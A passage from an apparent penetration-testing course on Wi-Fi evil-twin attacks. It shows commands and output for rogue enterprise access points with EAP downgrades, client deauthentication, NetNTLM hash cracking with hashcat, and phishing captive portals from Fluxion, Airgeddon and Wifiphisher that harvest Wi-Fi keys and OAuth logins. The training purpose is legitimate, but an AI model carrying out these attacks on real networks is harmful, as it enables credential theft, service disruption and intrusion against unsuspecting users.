* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]

```

With this `hostapd.eap_user` file, we instruct client devices attempting to join our network to use `TTLS-PAP` as their authentication method. In 802.1x security, the client and access point negotiate which method to use. By specifying the order of methods—starting with TTLS-PAP, then GTC, followed by TTLS-CHAP, TTLS-MSCHAP, and so on-we can potentially trick vulnerable client devices into using TTLS-PAP or GTC, thereby exposing their cleartext identity and credentials. Additionally, we specify the challenge password `challenge1234`, which was used in the generation of our server's private keys.

At this stage, we can start the rogue access point using `hostapd-wpe` with the following command:

```shell
sudo hostapd-wpe -c -k hostapd.conf

rfkill: Cannot open RFKILL control device
random: Only 15/20 bytes of strong random data available
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

```

Here’s an explanation of the options used with hostapd-wpe:

- `-c Cupid Mode`: Enables Heartbleed vulnerability testing for connected clients. This mode attempts to exploit vulnerable devices by leveraging the Heartbleed bug in OpenSSL.
- `-k Karma Mode`: Configures the rogue AP to respond to all probe requests, effectively tricking clients into connecting by mimicking their preferred networks.

Optionally, if we prefer to use `hostapd-mana` to host the rogue AP, we will need to enable Karma Mode (Mana) in the configuration file. Unlike `hostapd-wpe`, which allows us to specify Karma Mode directly via the command line argument (-k), `hostapd-mana` requires us to configure it within the file itself. This setup allows the rogue AP to respond to all probe requests.

To use hostapd-mana, `append` the configuration `hostapd.conf` file with following:

```configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1

```

- `enable_mana=1`: Enables Karma (mana) mode to respond to all probe requests.
- `mana_loud=1`: Makes the rogue AP more noticeable by aggressively responding to probe requests, increasing the chances of clients connecting.
- `mana_credout=credentials.creds`: Specifies the file where captured credentials will be saved.
- `mana_eapsuccess=1`: Forces a successful EAP authentication, even if the client doesn’t complete the full process.
- `mana_wpe=1`: Enables WPA Enterprise functionality, making the rogue AP act as an enterprise AP for relaying captured credentials.

To start the rogue AP using hostapd-mana we use following command:

```shell
hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 00:11:22:33:44:00 and ssid "HTB-Wireless"
random: Only 18/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED

```

* * *

### 4\. Deauthenticate Connected Clients

If everything is set up correctly, our access point should be operational and ready to capture credentials from client devices. To observe our access point in action and monitor the connectivity of client devices, we can start an `airodump-ng` session in a second terminal.

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 6 s ][ 2024-08-23 09:47

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 00:11:22:33:44:00  -28 100       97        0    0   1   54   WPA2 CCMP   MGT  HTB-Wireless
 9C:9A:03:39:BD:7A  -28 100       97        5    0   1   54   WPA2 CCMP   MGT  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  16:C5:68:79:A8:12  -29   12 -54      0        4

```

From the airodump-ng output, we can see that our fake access point, named `HTB-Wireless`, has been successfully created. Now, we need to wait for clients to connect to our network.

If, after some time, connected clients do not automatically switch to our network due to the KARMA attack (and they remain associated with the original access point in our airodump-ng session), we may need to perform a `deauthentication attack`. This will disconnect clients from the target access point, encouraging them to connect to our fake AP. We can execute this attack using the following command, specifying the target access point's BSSID and the client’s MAC address.

```shell
sudo aireplay-ng -0 6 -a 9C:9A:03:39:BD:7A -c 16:C5:68:79:A8:12 wlan0mon

09:57:49  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
09:57:49  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:57:50  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]
09:57:50  Sending 64 directed DeAuth (code 7). STMAC: [16:C5:68:79:A8:12] [ 0| 0 ACKs]

```

* * *

### 5\. Capture the Credentials

Once a client successfully connects to our fake access point and EAP negotiation is successful, we should observe output similar to the following in the hostapd-mana/hostapd-wpe tab:

```shell
wlan1: AP-ENABLED
MANA - Directed probe request for SSID 'HTB-Wireless' from 16:C5:68:79:A8:12
MANA - Directed probe request for SSID 'HTB-Wireless' from 16:C5:68:79:A8:12
wlan1: STA 16:C5:68:79:A8:12 IEEE 802.11: authenticated
wlan1: STA 12:c2:9c:78:a6:0d IEEE 802.1X: Identity received from STA: 'HTB\Administrator'

mschapv2: Wed Aug 21 12:52:31 2024
	 username:			HTB\Administrator
	 challenge:			45:14:53:22:49:08:8c:58
	 response:			10:51:1c:55:42:d6:04:1d:b2:2a:d6:29:73:ad:76:0c:6f:f5:07:d3:3a:dd:6d:b3
	 jtr NETNTLM:			Administrator:$NETNTLM$as65a4sd564d1a2s$54as56d65asasd55asd564asd564asd555asd564as6d55s5
	 hashcat NETNTLM:		Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s

```

To begin our attempt at cracking the hash (in order to gain access to our target access point), we need to choose a suitable wordlist, which may include our end user's password. Once we have located the desired wordlist, we can employ the following command to run a password cracking attack against our captured hash. We specify `-m 5500` for the correct hash mode, `-a 0` for the attack mode, our captured `NetNTLM` hash in Hashcat format, and finally, the dictionary file we will attempt cracking with.

```shell
hashcat -m 5500 -a 0 Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s wordlist.dict

<snip>

Administrator::::54as56d65asasd55asd564asd564asd555asd564as6d55s5:as65a4sd564d1a2s:Wowwhatasecurepassword123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: Administrator::::54as56d65asasd55asd564asd564asd55...4d1a2s
Time.Started.....: Day Mon 12 34:56:78 xxxx (0 secs)
Time.Estimated...: Day Mon 12 34:56:78 xxxx (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlist.dict)
Guess.Queue......: 1/10000 (100.00%)
Speed.#1.........:     1733 H/s (0.02ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1/10000 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Wowwhatasecurepassword123 -> Wowwhatasecurepassword123
Hardware.Mon.#1..: Temp: 54c Fan:  0% Util: 29% Core:1882MHz Mem:7300MHz Bus:16

```

If **Hashcat** does not work within the provided attacker VM, it is recommended to use **Pwnbox** or your **local VM** to run Hashcat.

At this stage, we will have obtained the correct password to access our target network or carry out other malicious actions.


# Using Fluxion

* * *

In this section, we will explore how to leverage [Fluxion](https://github.com/FluxionNetwork/fluxion) to automate the evil-twin attack on WPA/WPA2 networks. By using Fluxion, we can automate the process of creating a rogue access point, deauthenticating clients from the legitimate network, and harvesting credentials through a captive portal. Fluxion simplifies the steps involved, allowing us to efficiently perform the attack with minimal manual configuration.

`Fluxion` is a versatile and powerful tool designed for ethical hacking and Wi-Fi penetration testing. It uses a Man-in-the-Middle (MitM) attack strategy to create a fake access point that closely mimics the target network. The tool's primary objective is to capture WPA/WPA2 passwords by tricking users into entering their credentials, rather than relying on brute-force or dictionary attacks. Fluxion’s approach focuses on user manipulation, making it a targeted and efficient method for auditing wireless security.

* * *

## Performing the attack

The evil twin attack using the Fluxion tool involves two key steps:

1. `Capturing the Handshake`: This step involves capturing the WPA/WPA2 handshake, which will later be validated against the correct password provided by the victim.
2. `Hosting the Fake Captive Portal`: A rogue access point with a fake login page is deployed to trick users into entering their Wi-Fi credentials.

We will need two WLAN interfaces to perform this attack. One interface, wlan0, will be set to monitor mode for scanning and conducting deauthentication attacks against clients. The second interface, wlan1, will be in master mode, hosting our fake access point (AP) for clients to connect to.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

```

### 1\. Capturing the Handshake

```shell
bash /opt/fluxion/fluxion.sh -i

```

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_001.PNG)

Before setting up the captive portal, obtaining a valid handshake file is essential. This handshake file allows `Fluxion` to verify the correctness of the credentials entered by the user in the captive portal. To capture the WPA/WPA2 handshake, we select `Option 2: Handshake Snooper` in the Fluxion tool.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_002.PNG)

We will select `wlan0 (Option 1)` in Fluxion to initiate the target search process. This interface will be used to scan for available Wi-Fi networks and identify the target for the attack.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_003.PNG)

To monitor all channels over the 2.4GHz band, we select `Option 1`.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_004.PNG)

This action will launch an xterm terminal to scan and discover available networks. Once the scan has captured sufficient data, press `Ctrl+C` to stop the scan.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_005.PNG)

Afterward, we proceed to select the target network. In our case, the target network is `HTB-Wireless`, corresponding to `Option 1` in the displayed list.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_006.PNG)

Next, we skip the `Target Tracking` option by selecting `Option 3` and allow the console to automatically select the appropriate interface for tracking the target.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_007.PNG)

Next, we select `Option 2: aireplay-ng deauthentication` for handshake retrieval. This method sends deauthentication packets to the target client, forcing it to reconnect to the network, thereby capturing the handshake during the re-authentication process.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_008.PNG)

We then select the same interface, `wlan0 (Option 1)`, to handle both monitoring and jamming activities. This interface will be used to send deauthentication packets and capture the handshake.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_009.PNG)

Next, we choose the `aircrack-ng verification` method to validate the captured handshake by selecting `Option 1`.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0010.PNG)

We configure the verifier to check for a handshake every 30 seconds by selecting `Option 1`. This ensures periodic verification of captured handshakes for efficient monitoring.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0011.PNG)

Next, we choose the `option 2` to synchronously verify the handshake. This will ensure that the verification process runs concurrently with handshake capture, allowing real-time validation of the captured data.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0012.PNG)

Upon pressing Enter, three terminals will open. The handshake capture and deauthentication terminals will automatically close once the necessary traffic is captured. A message stating `Handshake Snooper attack completed` will appear in the Snooper terminal, indicating that the handshake has been successfully saved. At this point, we can close the Snooper terminal.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0013.PNG)

* * *

### 2\. Hosting the Fake Captive Portal

Now that we have successfully captured the handshake, we can proceed with setting up the Captive Portal attack. This involves creating a fake login page that will prompt the user to enter their credentials, which we can capture. Fluxion will simulate a legitimate network and interact with the target user through the captive portal. Let's begin configuring and deploying the rogue access point.

To start the captive portal attack, we select `Option 1`, Select another attack. This will prompt us to choose the type of attack to proceed with, and from here we can then proceed to set up the captive portal by again selecting `Option 1`, Captive Portal Creates an "evil twin" access point.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0014.PNG)![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0015.PNG)

After selecting `Option 1` to start the attack, Fluxion will automatically choose the target access point based on the captured handshake. Type `Y` to confirm and continue with the selected target, then select `Option 3` to skip target tracking and let Fluxion handle it automatically.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0016.PNG)![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0017.PNG)

We then select the available `wlan1` interface by selecting `Option 2` to handle the jamming. This interface will be used to send deauthentication packets to the clients.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0018.PNG)

Next, select `Option 2` to choose the `wlan0` interface for hosting the fake access point. This interface will be used to broadcast the rogue `evil twin` access point, mimicking the legitimate target network.
![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0019.PNG)

For the deauthentication method, select `Option 2` to use aireplay.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0020.PNG)

We select `Option 1` to use hostapd for starting the fake access point
.
![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0021.PNG)

For the password verification method, we select `Option 1` to use cowpatty. This choice is preferred as aircrack-ng is often unreliable in verifying captured credentials during the attack.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0022.PNG)

Next, Fluxion automatically locates the hash from the captured handshake. We select `Option 1` to `Use hash found` for the verification process.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0023.PNG)

For hash verification, we select `Option 1` to use the Aircrack-ng verification method.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0024.PNG)

Next, we select `Option 1` to create an SSL certificate for our captive portal. This step enhances the legitimacy of our captive portal, making it appear more credible to the target.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0025.PNG)

To ensure connected clients are redirected to the captive portal and prompted to enter their credentials, we need to disrupt their internet access. We select `Option 1` to disconnect the internet access for connected clients.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0026.PNG)

Finally, we choose the portal interface for our captive portal. To mimic a familiar environment and enhance credibility, we select `Option 54`, which is the `Netgear portal`.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0027.PNG)

This ensures that the captive portal closely resembles a legitimate Netgear login page, increasing the likelihood that users will enter their credentials.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_netgear.PNG)

Once we hit enter, six new tabs will open, and the attack will commence. As soon as the client connects to our fake access point and enters their credentials through the captive portal, the credentials will be saved to a log file. After this, all the other tabs will close, indicating that the attack has been successfully completed.

![Fluxion](https://academy.hackthebox.com/storage/modules/291/fluxion/fluxion_0028.PNG)


# Using Airgeddon

* * *

In this section, we will explore another tool `Airgeddon`, a tool similar to `Fluxion` for automating evil twin attacks. Airgeddon simplifies the process of setting up a rogue access point, deauthenticating clients from the legitimate network, and capturing credentials through a captive portal.

* * *

## Performing the attack

Similar to Fluxion, the evil twin attack using the Airgeddon tool also involves two key steps:

1. `Capturing the Handshake`: This step involves capturing the WPA/WPA2 handshake, which will later be validated against the correct password provided by the victim.
2. `Hosting the Fake Captive Portal`: A rogue access point with a fake login page is deployed to trick users into entering their Wi-Fi credentials.

We will need two WLAN interfaces to perform this attack. One interface, wlan0, will be set to monitor mode for scanning and conducting deauthentication attacks against clients. The second interface, wlan1, will be in master mode, hosting our fake access point (AP) for clients to connect to.

```shell
iwconfig

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

```

We start Airgeddon using the following command:

```shell
bash /opt/airgeddon/airgeddon.sh

```

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_001.PNG)

Before setting up the captive portal, obtaining a valid handshake file is essential. This handshake file allows `Airgeddon` to verify the correctness of the credentials entered by the user in the captive portal.

We begin by selecting the interface to work with. For this, we choose `wlan0` by pressing `option 2`.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_002.PNG)

Next, we enable monitor mode on the selected interface. To do this, we press `option 2` again, which puts the wlan0 interface into monitor mode, preparing it for the attack.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_003.PNG)

Next, we press `option 7` to access the Evil Twin attack menu, where we can configure and launch the attack. This menu provides the tools necessary to set up a fake access point and capture credentials from unsuspecting users.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_004.PNG)

Since we are conducting an Evil Twin AP attack with a captive portal, we proceed by pressing `Option 9`. This initiates the setup process for creating a fake access point configured to redirect users to a captive portal for credential harvesting.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_005.PNG)

The tool will then begin scanning for nearby wireless networks in a new window. After a few seconds, once our target appears in the terminal, we can press `Ctrl + C` to stop the scanning process and close the terminal.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_006.PNG)

Since there is only one target, it will be automatically selected when we press `Enter`. However, if multiple targets were available, we would need to manually choose the desired target from the list.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_007.PNG)

Next, we select the deauthentication method by choosing `Option 2: Aireplay-ng`. This will allow us to perform deauthentication attacks to disconnect clients from the legitimate access point.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_008.PNG)

Since we do not want to enable "DOS pursuit mode," which aggressively tracks and deauthenticates clients, we simply type `N` and press Enter to proceed without enabling this feature.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_009.PNG)

We opt not to spoof our MAC address for this attack. Therefore, we type `N` and press Enter to proceed without modifying the MAC address. Since we don't have a pre-captured handshake file, we select `N` to allow Airgeddon to automatically capture the handshake for us. Next, we configure the default timeout for Airgeddon to check for a captured handshake every `10` seconds, ensuring it continuously monitors and verifies the handshake acquisition.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0012.PNG)![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0014__.PNG)![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0013.PNG)

Once Airgeddon captures a valid handshake file, we simply press `Enter` twice. The first press confirms the default path for storing the handshake file, and the second press accepts the default location for saving the password file, which will be used by the captive portal to retrieve the Wi-Fi credentials entered by the client.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0021.PNG)![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0015.PNG)

Next, we choose the language in which the network clients will see the captive portal. We select `Option 1`, which is English, for the portal's language.
![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0016.PNG)

Since we don't want to use the advanced captive portal, we press `N` to skip the advanced options and proceed with the standard captive portal setup.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0017.PNG)

The standard captive portal in Airgeddon appears as shown in the screenshot below. You can also customize the default Airgeddon's captive portal, as demonstrated in this [Wiki](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ%20&%20Troubleshooting#can-the-evil-twin-captive-portal-page-be-customized-if-so-how).

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/captive_air.PNG)

Once we press enter, six new tabs will open to initiate the attack. When the client connects to our fake access point and submits their credentials through the captive portal, the credentials will be saved to a log file. Once the data is captured, all other tabs will close, and the control tab will remain open, displaying the location of the log file along with the captured password, confirming the success of the attack.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0018.PNG)

If the client enters a valid password, it will be displayed on the `control` tab and saved in a text file named `evil_twin_captive_portal_password-HTB-Wireless.txt` located inside the `/root` directory.

![Airgeddon](https://academy.hackthebox.com/storage/modules/291/airgeddon_2/airgeddon_0019.PNG)


# Using WifiPhisher

* * *

[Wifiphisher](https://github.com/wifiphisher/wifiphisher) is a rogue access point framework designed for red team operations and Wi-Fi security assessments. It allows penetration testers to achieve a man-in-the-middle position against wireless clients by executing targeted Wi-Fi association attacks. Additionally, Wifiphisher facilitates customized web phishing campaigns to capture sensitive credentials, such as third-party login information or WPA/WPA2 Pre-Shared Keys, and can also be used to deliver malware to victim devices. By default, `wifiphisher` performs both Evil Twin and KARMA attacks.

Wifiphisher offers three primary phishing scenarios to target wireless clients effectively:

1. `OAuth Phishing`: Simulates a third-party login page to steal credentials, such as email or social media logins.
2. `Firmware Upgrade Phishing`: Mimics a firmware update page for routers or devices, tricking users into entering credentials.
3. `Plugin Update Phishing`: Displays a fake plugin update notification, prompting users to download malware and compromise the network.

These scenarios allow penetration testers to adapt their attacks based on the target's behavior and environment. In this section we will explore all the 3 phishing scenarios in detail.

### 1\. OAuth Phishing

This attack involves creating an `open` Wi-Fi network that mimics popular public Wi-Fi networks. It works by broadcasting beacon frames of known open Wi-Fi networks using entries from this [list](https://github.com/wifiphisher/wifiphisher/blob/bc4a077e090d59b065cf2c65b0ec1890b9eb4698/wifiphisher/data/wifiphisher-known-open-wlans).

When deployed, the attack targets devices with automatic association enabled, tricking them into connecting to the rogue network. This technique exploits users trust in familiar Wi-Fi network names, making it particularly effective in environments like `cafes`, `airports`, or `shopping centers`. Once connected, phishing scenario of the `OAuth Login` would be launched to harvest credentials.

To initiate the attack, execute the following command:

```shell
wifiphisher --essid "FREE WI-FI" -p oauth-login -kB -kN

Authorization required, but no authorization protocol specified
Authorization required, but no authorization protocol specified
[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2025-01-18 21:53
[+] Timezone detected. Setting channel range to 1-13
[+] Selecting wlan1 interface for the deauthentication attack
[+] Selecting wlan0 interface for creating the rogue Access Point
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:aa:45:fa
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:67:87:44
[*] Cleared leases, started DHCP, set up iptables
[+] Selecting OAuth Login Page template
[*] Starting the fake access point...
[*] Starting HTTP/HTTPS server at ports 8080, 443
[+] Show your support!
[+] Follow us: https://twitter.com/wifiphisher
[+] Like us: https://www.facebook.com/Wifiphisher
[+] Captured credentials:

```

Explanation of the command:

| Argument | Description |
| --- | --- |
| `--essid "FREE WI-FI"` | Sets the name of the rogue Wi-Fi network to "FREE WI-FI". |
| `-p oauth-login` | Specifies the phishing scenario to be used, in this case, "OAuth Login". |
| `-kB` | Enables the Known Beacon attack, which broadcasts beacon frames of popular open Wi-Fi networks. |
| `-kN` | Prevents the attack from killing the NetworkManager, allowing you to maintain other network functionalities on the attacking machine. |

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/001.PNG)

Once the attack is initiated, we will observe multiple `open` Wi-Fi networks available for connection. These networks are broadcasted as part of the `Known Beacon attack`, which simulates commonly seen open Wi-Fi networks from a predefined list.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/002.PNG)

Once a victim connect, the selected phishing scenario, `OAuth Login`, will prompt them to enter their credentials, which will then be captured.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/003.PNG)![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/004_.PNG)

Before proceeding with the next attack, it's a good practice to reset the network interfaces to their normal state by running the following command:

```shell
sudo systemctl restart NetworkManager

```

This ensures that the Wi-Fi interfaces are properly restored and ready for further use, especially if any network management changes were made during the previous attack.

* * *

### 2\. Firmware Upgrade Phishing

This attack leverages a fake firmware update page designed to deceive users into entering their credentials, often under the guise of a critical security update for their router or device.

To execute this attack effectively, a valid captured handshake of the victim's Wi-Fi network is required. The handshake allows Wifiphisher to verify the correctness of the Pre-Shared Key (PSK) submitted by the victim. When the victim enters their credentials, Wifiphisher cross-checks the provided PSK against the captured handshake file (e.g., handshake.pcap) to confirm its validity.

To capture a valid handshake, we check available adapters using `iwconfig` command.

```shell
iwconfig

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

lo        no wireless extensions.

eth0      no wireless extensions.

```

We put the wlan0 interface into monitor mode by running:

```shell
airmon-ng start wlan0

```

Next, we launch a scan using airodump-ng to identify available Wi-Fi networks and save the output to a file:

```shell
airodump-ng wlan0mon -c 1 -w HTB

 CH  1 ][ Elapsed: 48 s ][ 2025-01-19 22:35 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28 100      475       90    0   1   54   WPA2 TKIP   PSK  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  02:00:00:00:01:00  -29   11 -11      0       78  EAPOL  HTB-Wireless

```

To force clients to disconnect and reconnect, triggering the handshake capture, we use aireplay-ng.

```shell
aireplay-ng --deauth 5 -a 52:CD:8C:79:AD:87 wlan0mon

22:35:19  Waiting for beacon frame (BSSID: 52:CD:8C:79:AD:87) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
22:35:19  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
22:35:20  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
22:35:20  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
22:35:21  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]
22:35:21  Sending DeAuth (code 7) to broadcast -- BSSID: [52:CD:8C:79:AD:87]

```

We then take a look for a message in the `airodump-ng` terminal indicating a handshake has been captured. The file (e.g., HTB-01.cap) now contains the captured handshake.

```shell
airodump-ng wlan0mon -c 1 -w HTB

 CH  1 ][ Elapsed: 48 s ][ 2025-01-19 22:35 ][ WPA handshake: 52:CD:8C:79:AD:87

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28 100      475       90    0   1   54   WPA2 TKIP   PSK  HTB-Wireless

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  02:00:00:00:01:00  -29   11 -11      0       78  EAPOL  HTB-Wireless

```

```shell
ls

HTB-01.cap

```

We can stop the monitor mode on wlan0mon interface

```shell
airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy2	wlan0mon	mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 station mode vif enabled on [phy2]wlan0)
		(mac80211 monitor mode vif disabled for [phy2]wlan0mon)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
phy4	wlan2		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211

```

Finally, to host a fake Access Point (AP) with a custom firmware page, we can execute the following command:

```shell
wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade --handshake-capture HTB-01.cap -kN

Authorization required, but no authorization protocol specified
[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2025-01-18 22:07
[+] Timezone detected. Setting channel range to 1-13
[+] Selecting wlan1 interface for the deauthentication attack
[+] Selecting wlan0 interface for creating the rogue Access Point
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:44:12:0e
[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:a8:34:e9
[*] Cleared leases, started DHCP, set up iptables

```

Here's a breakdown of the command:

| Argument | Description |
| --- | --- |
| `-aI wlan0` | This specifies the interface (wlan0) that will host the rogue AP. |
| `-eI wlan1` | This specifies the interface (wlan1) that will perform the deauthentication and DOS attack. |
| `-p firmware-upgrade` | This selects the phishing scenario, in this case, a fake firmware update page. |
| `--handshake-capture HTB-01.cap` | This option provides the path to the valid captured handshake file (HTB-01.cap), which will be used to check the correct WPA key when the victim connects to the rogue AP. |
| `-kN` | Prevents the attack from killing the NetworkManager, allowing you to maintain other network functionalities on the attacking machine. |

Once the target network is identified, we press `[Enter]` to select it. Wifiphisher then automatically performs the deauthentication attack, disconnecting clients currently connected to the target network. Afterward, the disconnected clients are redirected to the rogue access point, which is now broadcasting, making them attempt to reconnect.

![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/net_000.PNG)![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/net_001.PNG)

The rogue AP appears to the clients as the legitimate network, leading them to interact with the phishing page (such as the fake firmware upgrade page).
![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/net_002.PNG)![WiFiPhisher](https://academy.hackthebox.com/storage/modules/291/wifiphisher/net_003_.PNG)

